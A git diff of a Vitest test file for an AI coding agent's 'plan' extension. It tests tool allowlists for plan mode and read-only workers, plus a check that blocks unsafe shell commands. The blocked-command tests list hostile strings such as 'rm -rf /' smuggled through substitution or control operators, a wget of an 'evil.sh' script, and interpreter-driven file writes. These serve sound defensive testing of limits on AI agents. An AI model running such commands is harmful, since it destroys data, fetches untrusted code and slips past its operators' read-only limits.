@@ -2,7 +2,12 @@ import { readdir } from "node:fs/promises";
 import { resolve } from "node:path";
 import { beforeEach, describe, expect, it, vi } from "vitest";
 import planExtension from "../../extensions/plan/plan.ts";
-import { isSafeBashCommand } from "../../extensions/plan/src/enforcement.ts";
+import { PLAN_ALLOWED_TOOLS } from "../../extensions/plan/src/constants.ts";
+import {
+  buildPlanModeTools,
+  buildWorkerReadonlyTools,
+  isSafeBashCommand,
+} from "../../extensions/plan/src/enforcement.ts";
 import { addTodoItems, clearTodoItems, getTodoItems, markTodoItems } from "../../lib/todos.ts";
 import { createMockCommandContext } from "../mocks/context-mocks.ts";
 import { createMockPi } from "../mocks/pi-mocks.ts";
@@ -64,16 +69,31 @@ describe("plan-extension", () => {
   });
 
   describe("/plan toggle", () => {
-    it("enters plan mode: filters mutating tools, adds plan_submit, clears status", async () => {
+    it("enters plan mode: keeps research and worker tools, adds plan_submit", async () => {
       const mockPi = createMockPi();
-      mockPi.getActiveTools = vi.fn(() => ["read", "bash", "edit", "write", "grep"]);
+      mockPi.getActiveTools = vi.fn(() => [
+        "read",
+        "bash",
+        "edit",
+        "write",
+        "grep",
+        "delegate",
+        "workers",
+      ]);
       const mockCtx = createMockCommandContext();
       await planExtension(mockPi);
 
       const planHandler = getCommandHandler(mockPi, "plan");
       await planHandler("", mockCtx);
 
-      expect(mockPi.setActiveTools).toHaveBeenCalledWith(["read", "bash", "grep", "plan_submit"]);
+      expect(mockPi.setActiveTools).toHaveBeenCalledWith([
+        "read",
+        "bash",
+        "grep",
+        "delegate",
+        "workers",
+        "plan_submit",
+      ]);
       // No footer status is published; plan mode is signaled on the input bar.
       expect(mockCtx.ui.setStatus).not.toHaveBeenCalled();
       expect(mockPi.events.emit).toHaveBeenCalledWith("plan:mode-change", { mode: "plan" });
@@ -89,7 +109,15 @@ describe("plan-extension", () => {
 
     it("exits plan mode: restores the captured tool set and clears status", async () => {
       const mockPi = createMockPi();
-      mockPi.getActiveTools = vi.fn(() => ["read", "bash", "edit", "write", "grep"]);
+      mockPi.getActiveTools = vi.fn(() => [
+        "read",
+        "bash",
+        "edit",
+        "write",
+        "grep",
+        "delegate",
+        "workers",
+      ]);
       const mockCtx = createMockCommandContext();
       await planExtension(mockPi);
 
@@ -99,7 +127,15 @@ describe("plan-extension", () => {
 
       await planHandler("", mockCtx);
 
-      expect(mockPi.setActiveTools).toHaveBeenCalledWith(["read", "bash", "edit", "write", "grep"]);
+      expect(mockPi.setActiveTools).toHaveBeenCalledWith([
+        "read",
+        "bash",
+        "edit",
+        "write",
+        "grep",
+        "delegate",
+        "workers",
+      ]);
       expect(mockCtx.ui.setStatus).not.toHaveBeenCalled();
       expect(mockPi.events.emit).toHaveBeenCalledWith("plan:mode-change", { mode: "off" });
       expect(mockPi.appendEntry).toHaveBeenLastCalledWith(
@@ -184,11 +220,62 @@ describe("plan-extension", () => {
         reason: expect.stringContaining("not on the read-only allowlist"),
       });
 
+      // Shell substitution and interpreter-powered writes are gated too.
+      for (const command of [
+        `echo "$(node -e 'require("fs").writeFileSync("pwned","1")')"`,
+        `cat <(python -c 'import os; os.system("touch pwned")')`,
+      ]) {
+        const substitution = await toolCall(
+          { type: "tool_call", toolCallId: "3", toolName: "bash", input: { command } },
+          mockCtx,
+        );
+        expect(substitution).toMatchObject({ block: true });
+      }
+
       const allowed = await toolCall(
         { type: "tool_call", toolCallId: "2", toolName: "bash", input: { command: "git status" } },
         mockCtx,
       );
       expect(allowed).toBeUndefined();
+    });
+
+    it("allows worker orchestration but blocks patch collection in plan mode", async () => {
+      const mockPi = createMockPi();
+      const mockCtx = createMockCommandContext();
+      await planExtension(mockPi);
+      await getCommandHandler(mockPi, "plan")("", mockCtx);
+
+      const toolCall = getEventHandler(mockPi, "tool_call");
+      await expect(
+        toolCall(
+          { type: "tool_call", toolCallId: "1", toolName: "delegate", input: { task: "scout" } },
+          mockCtx,
+        ),
+      ).resolves.toBeUndefined();
+      await expect(
+        toolCall(
+          { type: "tool_call", toolCallId: "2", toolName: "workers", input: { action: "status" } },
+          mockCtx,
+        ),
+      ).resolves.toBeUndefined();
+
+      const collect = await toolCall(
+        { type: "tool_call", toolCallId: "3", toolName: "workers", input: { action: "collect" } },
+        mockCtx,
+      );
+      expect(collect).toEqual({
+        block: true,
+        reason: expect.stringContaining("cannot collect"),
+      });
+
+      const unknown = await toolCall(
+        { type: "tool_call", toolCallId: "4", toolName: "unknown_mutator", input: {} },
+        mockCtx,
+      );
+      expect(unknown).toEqual({
+        block: true,
+        reason: expect.stringContaining("not available in plan mode"),
+      });
     });
 
     it("does not gate anything when plan mode is off", async () => {
@@ -335,21 +422,41 @@ describe("plan-extension", () => {
       expect(result2.details).toEqual({ error: "invalid_plan" });
     });
 
-    it("worker-readonly mode enforces the gate without planning machinery", async () => {
+    it("worker-readonly mode keeps only research tools without planning machinery", async () => {
       const mockPi = createMockPi();
       const mockCtx = createMockCommandContext();
-      mockPi.getFlag = vi.fn((name: string) => name === "worker-readonly");
-      mockPi.getActiveTools = vi.fn(() => ["read", "bash", "edit", "write"]);
+      let startupReady = false;
+      mockPi.getFlag = vi.fn((name: string) => startupReady && name === "worker-readonly");
+      mockPi.getActiveTools = vi.fn(() => [
+        "read",
+        "bash",
+        "edit",
+        "write",
+        "web_search",
+        "code_search",
+        "background",
+        "unknown_mutator",
+      ]);
       await planExtension(mockPi);
 
+      // Pi resolves extension CLI flags after the extension factory returns.
+      // The live worker must read the flag from session_start, not initialization.
+      startupReady = true;
       const sessionStart = getEventHandler(mockPi, "session_start");
       await sessionStart({ type: "session_start", reason: "startup" }, mockCtx);
 
-      // edit/write removed from the active tool set.
-      expect(mockPi.setActiveTools).toHaveBeenCalledWith(["read", "bash"]);
-      // plan_submit is not registered in headless workers.
+      // Only default-deny research tools remain active. Mutating and unknown
+      // extension tools cannot bypass the worker gate.
+      expect(mockPi.setActiveTools).toHaveBeenCalledWith([
+        "read",
+        "bash",
+        "web_search",
+        "code_search",
+      ]);
+      // plan_submit remains registered for normal sessions but is inactive and
+      // hard-blocked in a headless worker.
       const toolNames = mockPi.registerTool.mock.calls.map((call) => call[0].name);
-      expect(toolNames).not.toContain("plan_submit");
+      expect(toolNames).toContain("plan_submit");
 
       // The gate blocks mutations with the worker reason.
       const gate = getEventHandler(mockPi, "tool_call");
@@ -370,6 +477,29 @@ describe("plan-extension", () => {
         mockCtx,
       );
       expect(bashAllow).toBeUndefined();
+
+      for (const toolName of ["unknown_mutator", "plan_submit"]) {
+        const unavailableBlock = await gate(
+          { type: "tool_call", toolName, toolCallId: "t", input: {} },
+          mockCtx,
+        );
+        expect(unavailableBlock).toEqual({
+          block: true,
+          reason: expect.stringContaining("not available to read-only planning workers"),
+        });
+      }
+
+      // Substitution-based writes are blocked in headless workers too.
+      for (const command of [
+        `echo "$(node -e 'require("fs").writeFileSync("pwned","1")')"`,
+        `cat <(python -c 'import os; os.system("touch pwned")')`,
+      ]) {
+        const substitutionBlock = await gate(
+          { type: "tool_call", toolName: "bash", toolCallId: "t", input: { command } },
+          mockCtx,
+        );
+        expect(substitutionBlock).toMatchObject({ block: true });
+      }
 
       // No plan-context injection in headless workers.
       const beforeAgent = getEventHandler(mockPi, "before_agent_start");
@@ -910,6 +1040,10 @@ describe("plan-extension", () => {
       await sessionStart({ type: "session_start", reason: "startup" }, mockCtx);
 
       expect(mockPi.setActiveTools).toHaveBeenCalledWith(expect.arrayContaining(["plan_submit"]));
+      expect(mockPi.appendEntry).toHaveBeenCalledWith(
+        "plan-state",
+        expect.objectContaining({ state: expect.objectContaining({ mode: "plan" }) }),
+      );
       expect(mockCtx.ui.setStatus).not.toHaveBeenCalled();
     });
 
@@ -928,6 +1062,101 @@ describe("plan-extension", () => {
         expect.objectContaining({ state: expect.objectContaining({ mode: "plan" }) }),
       );
     });
+  });
+});
+
+describe("plan tool allowlist", () => {
+  it("keeps every actual read-only tool and adds plan_submit", () => {
+    const activeTools = [
+      "read",
+      "edit",
+      "write",
+      "bash",
+      "grep",
+      "find",
+      "ls",
+      "todo",
+      "messenger",
+      "ask_user",
+      "code_search",
+      "context7_resolve_library_id",
+      "context7_get_library_docs",
+      "context7_get_cached_doc_raw",
+      "web_search",
+      "web_fetch",
+      "delegate",
+      "workers",
+      "mission",
+      "autoresearch",
+      "background",
+      "monitor",
+      "jobs",
+    ];
+
+    expect(buildPlanModeTools(activeTools)).toEqual([
+      "read",
+      "bash",
+      "grep",
+      "find",
+      "ls",
+      "todo",
+      "messenger",
+      "ask_user",
+      "code_search",
+      "context7_resolve_library_id",
+      "context7_get_library_docs",
+      "context7_get_cached_doc_raw",
+      "web_search",
+      "web_fetch",
+      "delegate",
+      "workers",
+      "plan_submit",
+    ]);
+  });
+
+  it("contains exactly the read-only tool names and no extension directory names", () => {
+    expect([...PLAN_ALLOWED_TOOLS].sort()).toEqual(
+      [
+        "ask_user",
+        "bash",
+        "code_search",
+        "context7_get_cached_doc_raw",
+        "context7_get_library_docs",
+        "context7_resolve_library_id",
+        "find",
+        "grep",
+        "ls",
+        "messenger",
+        "read",
+        "delegate",
+        "workers",
+        "todo",
+        "web_fetch",
+        "web_search",
+      ].sort(),
+    );
+    for (const directoryName of ["ask-user", "code-search", "context7", "web-search"]) {
+      expect(PLAN_ALLOWED_TOOLS.has(directoryName), directoryName).toBe(false);
+    }
+  });
+
+  it("drops directory-style and unknown tool names", () => {
+    const staleTools = ["ask-user", "code-search", "context7", "web-search", "unknown_tool"];
+    expect(buildPlanModeTools(staleTools)).toEqual(["plan_submit"]);
+  });
+
+  it("keeps worker sessions on the research-only subset", () => {
+    expect(
+      buildWorkerReadonlyTools([
+        "read",
+        "web_search",
+        "code_search",
+        "delegate",
+        "workers",
+        "background",
+        "unknown_mutator",
+      ]),
+    ).toEqual(["read", "web_search", "code_search"]);
   });
 });
 
@@ -979,6 +1208,81 @@ describe("isSafeBashCommand", () => {
       "grep -rn install /home/user/.bun/install/global/node_modules",
       "git status 2>&1 | head -5",
       "cat package.json 2>&1",
+    ];
+    for (const command of safe) {
+      expect(isSafeBashCommand(command), command).toBe(true);
+    }
+  });
+
+  it("blocks shell command and process substitutions", () => {
+    const blocked = [
+      `echo "$(node -e 'require("fs").writeFileSync("pwned","1")')"`,
+      'echo "$(rm -rf /)"',
+      "echo $(cat package.json)",
+      "echo `date`",
+      `cat <(python -c 'import os; os.system("touch pwned")')`,
+      "cat >(tee out.txt)",
+      "diff <(git show HEAD:a.ts) <(git show HEAD~1:a.ts)",
+    ];
+    for (const command of blocked) {
+      expect(isSafeBashCommand(command), command).toBe(false);
+    }
+  });
+
+  it("blocks compound commands and control operators", () => {
+    const blocked = [
+      `cat a; node -e 'require("fs").writeFileSync("x","1")'`,
+      "cat a && touch b",
+      "git status || wget https://example.com/evil.sh",
+      "cat a\nrm -rf /",
+      "cat a & rm -rf /",
+      "cat a |& rm -rf /",
+      "echo x > out.txt",
+      "echo x >> out.txt",
+      "cat < input.txt",
+      "cat <<EOF",
+    ];
+    for (const command of blocked) {
+      expect(isSafeBashCommand(command), command).toBe(false);
+    }
+  });
+
+  it("blocks interpreter invocations and interpreter-powered writes", () => {
+    const blocked = [
+      `node -e 'require("fs").writeFileSync("x","1")'`,
+      `python -c 'open("x", "w").write("1")'`,
+      `perl -e 'unlink "x"'`,
+      `ruby -e 'File.write("x", "1")'`,
+      `cat file | node -e 'process.exit(0)'`,
+      `cat file | python3 -c 'print(1)'`,
+      "cat file | xargs touch newfile",
+      "find . -exec node -e 'x' {} +",
+      "find . -delete",
+      "fd . --exec rm",
+      `rg --pre 'node evil.js' pattern`,
+      "sed -n '1e touch /tmp/x' file",
+      "sed -n '1w /tmp/x' file",
+      "sed 's/a/b/e' file",
+      "sed 's/a/b/w /tmp/x' file",
+      "sort -o out.txt input.txt",
+      "env FOO=bar node evil.js",
+    ];
+    for (const command of blocked) {
+      expect(isSafeBashCommand(command), command).toBe(false);
+    }
+  });
+
+  it("allows pipelines of ordinary read-only commands", () => {
+    const safe = [
+      "cat package.json | jq .name",
+      "ls -la | head -20",
+      "git log --oneline | wc -l",
+      "grep -rn node src | head -5",
+      "find . -name '*.ts' -type f",
+      "sed -n '/plan/p' file.ts",
+      "env",
+      "env | grep PATH",
+      "git status 2>&1 | head -5",
     ];
     for (const command of safe) {
       expect(isSafeBashCommand(command), command).toBe(true);
